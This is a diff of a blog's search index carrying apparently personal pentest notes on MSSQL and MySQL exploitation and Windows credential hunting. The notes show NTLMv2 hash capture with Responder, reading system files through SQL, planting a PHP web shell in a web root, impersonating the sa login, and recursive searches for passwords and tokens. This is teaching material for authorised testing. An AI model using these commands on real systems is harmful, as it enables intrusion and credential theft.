+<p>➜ For more methods : <a href="https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet">cheat sheet</a></p>
+<h2 id="Run-Responder-Or-impacket-smbserver-And-Capture-Hash"><a href="#Run-Responder-Or-impacket-smbserver-And-Capture-Hash" class="headerlink" title="Run Responder Or impacket-smbserver And Capture Hash"></a>Run Responder Or impacket-smbserver And Capture Hash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.110.17</span><br><span class="line">[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab:B7E2425C4A7107:&lt;snip&gt; 069006E006700730061000000000000000000</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-smbserver share ./ -smb2support</span><br><span class="line"></span><br><span class="line">demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:&lt;snip&gt; 069006E006700730061000000000000000000</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><p>➜ By default, MSSQL allows reading any file on the operating system that the SQL Server account has permission to access.</p>
+<h4 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENROWSET(BULK N<span class="string">&#x27;C:/Windows/System32/drivers/etc/hosts&#x27;</span>, SINGLE_CLOB) <span class="keyword">AS</span> Contents</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line">BulkColumn</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------------------------------------------------------------------</span></span><br><span class="line"># Copyright (c) <span class="number">1993</span><span class="number">-2009</span> Microsoft Corp.</span><br><span class="line">#</span><br><span class="line"># This <span class="keyword">is</span> a sample HOSTS file used <span class="keyword">by</span> Microsoft TCP<span class="operator">/</span>IP <span class="keyword">for</span> Windows.</span><br><span class="line">#</span><br><span class="line"># This file <span class="keyword">contains</span> the mappings <span class="keyword">of</span> IP addresses <span class="keyword">to</span> hostnames. <span class="keyword">Each</span></span><br><span class="line"># entry should be kept <span class="keyword">on</span> an individual line. The IP address should</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENROWSET(BULK N<span class="string">&#x27;C:\Users\damundsen\Desktop\flag.txt&#x27;</span>, SINGLE_CLOB) <span class="keyword">AS</span> Contents</span><br><span class="line"></span><br><span class="line">BulkColumn</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------------------------------------------------------------------</span></span><br><span class="line"># Copyright (c) <span class="number">1993</span><span class="number">-2009</span> Microsoft Corp.</span><br><span class="line">#</span><br><span class="line"># This <span class="keyword">is</span> a sample HOSTS file used <span class="keyword">by</span> Microsoft TCP<span class="operator">/</span>IP <span class="keyword">for</span> Windows.</span><br><span class="line">#</span><br><span class="line"># This file <span class="keyword">contains</span> the mappings <span class="keyword">of</span> IP addresses <span class="keyword">to</span> hostnames. <span class="keyword">Each</span></span><br><span class="line"># entry should be kept <span class="keyword">on</span> an individual line. The IP address should</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Write-Files-On-The-Server"><a href="#Write-Files-On-The-Server" class="headerlink" title="Write Files On The Server"></a>Write Files On The Server</h1><p>➜ To write files using <code>MSSQL</code>, we need to enable <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option">Ole Automation Procedures</a>, which requires admin privileges</p>
+<h2 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h2><h4 id="Enable-Ole-Automation-Procedures"><a href="#Enable-Ole-Automation-Procedures" class="headerlink" title="Enable Ole Automation Procedures"></a>Enable Ole Automation Procedures</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> RECONFIGURE</span><br><span class="line"><span class="number">4</span><span class="operator">&gt;</span> GO</span><br><span class="line"><span class="number">5</span><span class="operator">&gt;</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="number">6</span><span class="operator">&gt;</span> GO</span><br><span class="line"><span class="number">7</span><span class="operator">&gt;</span> RECONFIGURE</span><br><span class="line"><span class="number">8</span><span class="operator">&gt;</span> GO</span><br></pre></td></tr></table></figure>
+
+<h4 id="Write-Files"><a href="#Write-Files" class="headerlink" title="Write Files"></a>Write Files</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&gt; DECLARE @OLE INT</span><br><span class="line">2&gt; DECLARE @FileID INT</span><br><span class="line">3&gt; EXECUTE sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @OLE OUT</span><br><span class="line">4&gt; EXECUTE sp_OAMethod @OLE, &#x27;OpenTextFile&#x27;, @FileID OUT, &#x27;c:\inetpub\wwwroot\webshell.php&#x27;, 8, 1</span><br><span class="line">5&gt; EXECUTE sp_OAMethod @FileID, &#x27;WriteLine&#x27;, Null, &#x27;&lt;?php echo shell_exec($_GET[&quot;c&quot;]);?&gt;&#x27;</span><br><span class="line">6&gt; EXECUTE sp_OADestroy @FileID</span><br><span class="line">7&gt; EXECUTE sp_OADestroy @OLE</span><br><span class="line">8&gt; GO</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Impersonate-Existing-Users"><a href="#Impersonate-Existing-Users" class="headerlink" title="Impersonate Existing Users"></a>Impersonate Existing Users</h1><p>➜ First, we need to identify which users we are allowed to impersonate. Sysadmins can impersonate any account by default, whereas non-administrative users require explicit permission to do so.</p>
+<h4 id="Verifying-our-Current-User-and-Role"><a href="#Verifying-our-Current-User-and-Role" class="headerlink" title="Verifying our Current User and Role"></a>Verifying our Current User and Role</h4><p>Let’s verify if our current user has the sysadmin role:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> go</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">julio                                                                                                                    </span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">          <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
+
+<p>As the returned value <code>0</code> indicates, we do not have the sysadmin role</p>
+<h4 id="Identify-Users-that-We-Can-Impersonate"><a href="#Identify-Users-that-We-Can-Impersonate" class="headerlink" title="Identify Users that We Can Impersonate"></a>Identify Users that We Can Impersonate</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">distinct</span> b.name</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> sys.server_permissions a</span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_principals b</span><br><span class="line"><span class="number">4</span><span class="operator">&gt;</span> <span class="keyword">ON</span> a.grantor_principal_id <span class="operator">=</span> b.principal_id</span><br><span class="line"><span class="number">5</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> a.permission_name <span class="operator">=</span> <span class="string">&#x27;IMPERSONATE&#x27;</span></span><br><span class="line"><span class="number">6</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="comment">-----------------------------------------------</span></span><br><span class="line">sa</span><br><span class="line">ben</span><br><span class="line">valentin</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
+
+<p>We can impersonate the <code>sa</code> user. Let us impersonate the user and try to execute the some commands.</p>
+<h4 id="Impersonating-the-SA-User"><a href="#Impersonating-the-SA-User" class="headerlink" title="Impersonating the SA User"></a>Impersonating the SA User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span></span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br><span class="line"><span class="number">4</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">sa</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">          <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Note:</strong> It’s recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database.</p>
+<h1 id="Linked-Servers"><a href="#Linked-Servers" class="headerlink" title="Linked Servers"></a>Linked Servers</h1><p><code>MSSQL</code> linked servers let one SQL Server query another server or database.</p>
+<h4 id="Identify-Linked-Servers-In-MSSQL"><a href="#Identify-Linked-Servers-In-MSSQL" class="headerlink" title="Identify Linked Servers In MSSQL"></a>Identify Linked Servers In MSSQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> srvname, isremote <span class="keyword">FROM</span> sysservers</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line">srvname                             isremote</span><br><span class="line"><span class="comment">----------------------------------- --------</span></span><br><span class="line">DESKTOP<span class="operator">-</span>MFERMN4\SQLEXPRESS          <span class="number">1</span></span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span>\SQLEXPRESS                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
+
+<p>As shown in the query output, we have the server name and the <code>isremote</code> column, where <code>1</code> indicates a remote server and <code>0</code> indicates a linked server.</p>
+<h4 id="Identify-The-User-Used-For-The-Connection"><a href="#Identify-The-User-Used-For-The-Connection" class="headerlink" title="Identify The User Used For The Connection"></a>Identify The User Used For The Connection</h4><p>We can find the linked server’s user and privileges using <code>EXECUTE</code>, to run commands on the remote server we need to specify it in <code>[ ]</code>.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">EXECUTE</span>(<span class="string">&#x27;select @@servername, @@version, system_user, is_srvrolemember(&#x27;&#x27;sysadmin&#x27;&#x27;)&#x27;</span>) <span class="keyword">AT</span> [<span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span>\SQLEXPRESS]</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------ ------------------------------ ------------------------------ -----------</span></span><br><span class="line">DESKTOP<span class="number">-0</span>L9D4KA\SQLEXPRESS     Microsoft <span class="keyword">SQL</span> Server <span class="number">2019</span> (RTM sa_remote                                <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
+<li><code>is_srvrolemember(&#39;sysadmin&#39;)</code> returning <code>1</code> confirms that the user <code>sa_remote </code> has <strong>sysadmin privileges</strong>.</li>
 </ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Service-Exploitation</category>
-        <category>MySQL</category>
+        <category>MSSQL</category>
       </categories>
       <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
+        <tag>MSSQL</tag>
+        <tag>MSSQL-Execute-Commands</tag>
+        <tag>MSSQL-Read-Files</tag>
+        <tag>MSSQL-Write-Files</tag>
+        <tag>MSSQL-Linked-Server</tag>
+        <tag>MSSQL-Impersonate-User</tag>
+        <tag>Capture-MSSQL-Service-Hash</tag>
       </tags>
   </entry>
   <entry>
@@ -1742,6 +1702,46 @@
       </tags>
   </entry>
   <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PTT : Abusing KeyTab ccache</title>
     <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
     <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
@@ -1883,6 +1883,455 @@
         <tag>SharpUp</tag>
         <tag>sc.exe</tag>
         <tag>Windows-Services</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pillaging :Windows  Credential Hunting &amp; Extraction</title>
+    <url>/2026/06/26/Pillaging-Windows-Credential-Hunting-Extraction/</url>
+    <content><![CDATA[<h1 id="Recursive-Credential-Search"><a href="#Recursive-Credential-Search" class="headerlink" title="Recursive Credential Search"></a>Recursive Credential Search</h1><blockquote>
+<p>Search recursively for common credential-related keywords.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\ &amp; <span class="built_in">findstr</span> /S /I /M /C:&quot;password&quot; /C:&quot;passwd&quot; /C:&quot;pwd&quot; /C:&quot;secret&quot; /C:&quot;token&quot; /C:&quot;apikey&quot; /C:&quot;api_key&quot; /C:&quot;connectionstring&quot; /C:&quot;connection string&quot; /C:&quot;credential&quot; *.txt *.ini *.config *.xml *.cfg *.conf *.json *.yaml *.yml *.ps1 *.bat</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Remove <code>/M</code> to display the matching lines instead of only the filenames.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\ &amp; <span class="built_in">findstr</span> /S /I /N /P /C:&quot;password&quot; /C:&quot;passwd&quot; /C:&quot;pwd&quot; /C:&quot;secret&quot; /C:&quot;token&quot; /C:&quot;apikey&quot; /C:&quot;api_key&quot; /C:&quot;connectionstring&quot; /C:&quot;connection string&quot; /C:&quot;credential&quot; *.*</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Or via PowerShell</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-Include</span> *.txt,*.ini,*.config,*.xml,*.cfg,*.conf,*.json,*.yaml,*.yml,*.ps1,*.bat <span class="operator">-File</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&quot;password|passwd|pwd|secret|token|apikey|api_key|connectionstring|connection string|credential&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Hunt-for-Credential-Files"><a href="#Hunt-for-Credential-Files" class="headerlink" title="Hunt for Credential Files"></a>Hunt for Credential Files</h1><blockquote>
+<p>➜ Search recursively for files whose names or extensions suggest they may contain credentials or connection information.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> C:\ /S /B *pass* *password* *cred* *secret* *token* *.config *.conf *.ini *.xml *.json *.yaml *.yml *.rdp *.vnc *.kdbx <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Alternatively, search for a specific file extension.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">where /R C:\ *.config</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Or via PowerShell</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-Include</span> *.config,*.conf,*.ini,*.xml,*.json,*.yaml,*.yml,*.rdp,*.vnc,*.cred,*.kdbx <span class="operator">-File</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="PowerShell-History-File"><a href="#PowerShell-History-File" class="headerlink" title="PowerShell History File"></a>PowerShell History File</h1><blockquote>
+<p>Default path:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Confirm the path for the current user</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">Get-PSReadLineOption</span>).HistorySavePath</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Read the current user’s history</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">gc</span> (<span class="built_in">Get-PSReadLineOption</span>).HistorySavePath</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Read every user’s history at once</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$user</span> <span class="keyword">in</span> ((<span class="built_in">ls</span> C:\users).fullname))&#123;<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$user</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Hunt-for-Unattend-and-Sysprep-Files"><a href="#Hunt-for-Unattend-and-Sysprep-Files" class="headerlink" title="Hunt for Unattend and Sysprep Files"></a>Hunt for Unattend and Sysprep Files</h1><blockquote>
+<p>➜ Search recursively for Windows unattended installation files that may contain embedded credentials.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-Include</span> Unattend.xml,Autounattend.xml,unattended.xml,sysprep.xml,sysprep.inf <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Or</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /S /B C:\unattend.xml C:\autounattend.xml C:\Windows\Panther\*.xml C:\Windows\System32\Sysprep\*.xml <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Inspect the credential section of any discovered file.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">type</span> <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Panther</span>\<span class="title">Unattend.xml</span></span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="User-Computer-Description-Fields"><a href="#User-Computer-Description-Fields" class="headerlink" title="User &#x2F; Computer Description Fields"></a>User &#x2F; Computer Description Fields</h1><blockquote>
+<p>Read the description field of all local user accounts.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; Get-LocalUser | Select-Object Name, Description</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Read the computer description field</p>
+</blockquote>
